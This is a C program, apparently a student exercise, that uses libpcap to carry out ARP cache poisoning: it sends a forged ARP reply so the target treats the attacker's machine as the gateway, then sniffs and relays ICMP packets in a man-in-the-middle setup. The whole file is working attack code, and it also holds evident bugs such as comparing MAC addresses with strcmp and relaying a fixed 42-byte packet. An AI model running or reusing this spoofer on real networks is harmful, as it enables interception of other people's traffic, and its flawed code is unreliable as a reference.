#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include<netinet/ip_icmp.h>   //Provides declarations for icmp header
//#include<netinet/udp.h>   //Provides declarations for udp header
//#include<netinet/tcp.h>   //Provides declarations for tcp header
//#include<netinet/ip.h>    //Provides declarations for ip header

#define ETHERNET_SIZE 14
/* ethernet headers are always exactly 14 bytes [1] */

#define ETHERNET_ADDR_LEN 6
#pragma pack(1)
struct ethernet_header {
    u_int8_t ethernet_dhost[ETHERNET_ADDR_LEN];
    u_int8_t ethernet_shost[ETHERNET_ADDR_LEN];
    uint16_t ether_type;            /* IP? ARP? etc */
};
#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
struct arp_header
{
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_int8_t hlen;      /* Hardware Address Length */
    u_int8_t plen;      /* Protocol Address Length */
    u_int16_t oper;     /* Operation Cdode          */
    u_int8_t sha[6];      /* Sender hardware address */
    struct in_addr spa_inaddr; /* Sender IP address       */
    u_int8_t tha[6];      /* Target hardware address */
    struct in_addr tpa_inaddr; /* Target IP address       */
};
void GrapMyMacIP(char* myMac);

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);
    pcap_t *handle;         /* Session handle */
    char *dev;         /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];   /* Error string */
    struct pcap_pkthdr *header;   /* The header that pcap gives us */
    const u_int8_t *packet;   /* The actual packet */
    int res,i,num;
    struct ethernet_header *Eth_req, *Eth_rpy;
    struct arp_header *Arp_req, *Arp_rpy;
    struct  ifreq s;
    struct in_addr sourceIP;
    struct in_addr ttargetIP;
    struct in_addr attackerIP;

    // ////////////////////DEVICE CHECK////////////////////////////////
    // ///////////////////////////////////////////////////////////////

    if (argc != 4){
        fprintf(stderr,"Usage: [device_name] [Sender IP] [Target IP]");
    }

    dev=argv[1];

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    // ////////////////////SEND ARP REQUEST////////////////////////////
    // ///////////////////////////////////////////////////////////////

    Eth_req = (struct ethernet_header*)malloc(sizeof(struct ethernet_header));
    Arp_req = (struct arp_header*)malloc(sizeof(struct arp_header));

    int soc = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    unsigned char mac_address[6];
    char ip_address[40];

    /* IP */
    strcpy(s.ifr_name, dev);
    if(ioctl(soc, SIOCGIFADDR, &s) < 0){ //ip
        perror("ioctl");
        exit(1);
    }
    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ip_address, sizeof(struct sockaddr));
    inet_pton(AF_INET, ip_address, &(attackerIP));
    //inet_pton(AF_INET, argv[2], &(sourceIP)); // argv[2]is gateway IP
    Arp_req->spa_inaddr = attackerIP;

    /* MAC */
    if(ioctl(soc, SIOCGIFHWADDR, &s)==0){ //mac
        memcpy(mac_address, s.ifr_addr.sa_data, 6);
    }

    for( i = 0 ; i < 6 ; ++i)
    {
        Arp_req -> sha[i] = mac_address[i] ;
        Eth_req -> ethernet_shost[i] = mac_address[i] ;
        Arp_req -> tha[i] = 0;
    }
    inet_pton(AF_INET, argv[3], &(ttargetIP)); //Arp_req -> tpa_inaddr.s_addr);
    Arp_req->tpa_inaddr = ttargetIP;

    /* packet */
    for (i = 0; i<6 ; i++){
        Eth_req->ethernet_dhost[i] = 0xff;
    }
    Eth_req -> ether_type = 0x608;

    Arp_req -> htype = 256;
    Arp_req -> ptype = 8;
    Arp_req -> hlen = '\x06';
    Arp_req -> plen = '\x04';
    Arp_req -> oper = 256;

    printf("\n");
    //connect two structure
    packet = (u_int8_t*)malloc(sizeof(*Arp_req)+sizeof(*Eth_req));

    memcpy((void*)packet,Eth_req,14);//ETHERNET_SIZE);
    memcpy((void*)packet+14,Arp_req,sizeof(*Arp_req)); // by address

    /* send packet */
    if (pcap_sendpacket(handle, packet, 42 /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t*)soc));
        return 0;
    }
    //free(Eth_req);
    //free(Arp_req);

    // ////////////////////RECEIVE ARP REPLY///////////////////////////
    // ///////////////////////////////////////////////////////////////

    Eth_rpy = (struct ethernet_header*)malloc(sizeof(struct ethernet_header));
    Arp_rpy = (struct arp_header*)malloc(sizeof(struct arp_header));

    //num=0;
    while(1){ //double pointer
        res = pcap_next_ex(handle, &header, &packet);
        if(res==0) {continue;}

        /* calc size of ARP heaer */
        Eth_rpy = (struct ethernet_header *)packet;
        Arp_rpy = (struct arp_header *)(packet + 14);

        /* check ARP? */
        if(Eth_rpy->ether_type!=0x608 && Arp_rpy->oper!=512  )
        {
            printf("not ARP reply\n");
            continue;
            //fprintf(stderr, "-----------------------This is not ARP packet----------------------");
        }
        printf("this : %s %s\n",&(Eth_rpy->ethernet_shost), &(Eth_req->ethernet_dhost));

        //arp requies
        if(strcmp((const char*)Eth_rpy->ethernet_shost, (const char*)Eth_req->ethernet_dhost))
        {
            printf("MAC : %x \n",&(Arp_rpy -> sha));
            printf("-----------\n");
            break;
        }

    }

    // ////////////////////SEND ARP REPLY/////////////////////////////
    // /////target is going to recognize attacker as gateway//////////

    for (i = 0; i<6 ; i++){
        Eth_req->ethernet_dhost[i] = Eth_rpy->ethernet_shost[i]; //@@ HERE @@
    }
    Eth_req -> ether_type = 0x608;
    Arp_req -> htype = 256;
    Arp_req -> ptype = 8;
    Arp_req -> hlen = '\x06';
    Arp_req -> plen = '\x04';
    Arp_req -> oper = 512;

    //MAC
    for( i = 0 ; i < 6 ; ++i)
    {
        Arp_req -> sha[i] = mac_address[i] ;
        Eth_req -> ethernet_shost[i] = mac_address[i] ;
        Arp_req -> tha[i] = 0;
    }

    //target
    printf("\n");

    //attacker ip
    inet_pton(AF_INET, argv[2], &(sourceIP)); //@@ HERE @@
    inet_pton(AF_INET, argv[3], &(ttargetIP)); //Arp_req -> tpa_inaddr.s_addr);
    Arp_req->spa_inaddr = sourceIP;
    Arp_req->tpa_inaddr = ttargetIP;

    //connect two structure
    packet = (u_int8_t*)malloc(sizeof(*Arp_req)+sizeof(*Eth_req));
    memcpy((void*)packet,Eth_req,ETHERNET_SIZE);
    memcpy((void*)packet+14, Arp_req, sizeof(*Arp_req)); // by address

    //send packet
    if (pcap_sendpacket(handle, packet, 42 /* size */) != 0)
    {
        //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(soc));
        return 0;
    }
    //free(Eth_req);
    //free(Arp_req);
    //free(Eth_rpy);
    //free(Arp_rpy);

    // ///////////////////////////////////////////////////////////////
    // ////////////////////RECIEVE A SNIFFED PACKET///////////////////
    // ///////////////////////////////////////////////////////////////

    // sniffed  = destination IP is not itself.
    struct icmphdr *icmp_header;
    struct iphdr *ip_header;
    struct ethernet_header *eth_header;
    const u_char * sniffed_pk;

    eth_header = (struct ethernet_header*)malloc(sizeof(struct ethernet_header));
    ip_header = (struct iphdr*)malloc(sizeof(struct iphdr));
    icmp_header = (struct icmphdr*)malloc(sizeof(struct icmphdr));

    printf("received a sniffed packet\n");
    while(1){ //double pointer
        res = pcap_next_ex(handle, &header, &sniffed_pk);
        if(res==0) {continue;}

        /* parse sniffed packet */
        eth_header = (struct ethernet_header*)sniffed_pk;
        ip_header = (struct iphdr *)(sniffed_pk + sizeof(struct ethernet_header));
        icmp_header = (struct icmphdr *)(sniffed_pk + sizeof(struct ethernet_header) + sizeof(struct iphdr));

        /* check icmp */
        if(eth_header->ether_type!=0x8 && ip_header->protocol != 1) //icmp
        {
            printf("NOT ICMP\n");
            continue;
        }
        else {
            printf("ICMP\n");

            /* SNIFFED = destination IP is not itself */
            if(!strcmp((const char*)&(ip_header->daddr), (const char*)&(attackerIP.s_addr))){
                printf("AA : %s , %s\n", (const char*)&(ip_header->daddr), (const char*)&(attackerIP.s_addr));
                continue;
            }
            else{
                printf("sniffed");
                break;
            }
        }
    }

    // ////////////////////RELAY THE SNIFFED PACKET///////////////////
    // ///////////////////////////////////////////////////////////////
    for (i=0; i<6; i++){
    eth_header -> ethernet_shost[i] = mac_address[i];
    }
    //ip_header -> saddr = mac_address; //QQQ where is port number eth? ip?
    if (pcap_sendpacket(handle, sniffed_pk, 42 /* size */) != 0)
    {
        printf("fail\n");
        //fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(soc));
        return 0;
    }



    // ////////////////////RECEIVE ARP REPLY//////////////////////////
    // ///////////////////////////////////////////////////////////////



    /* And close the session */
    pcap_close(handle);

    return(0);
    //}
}
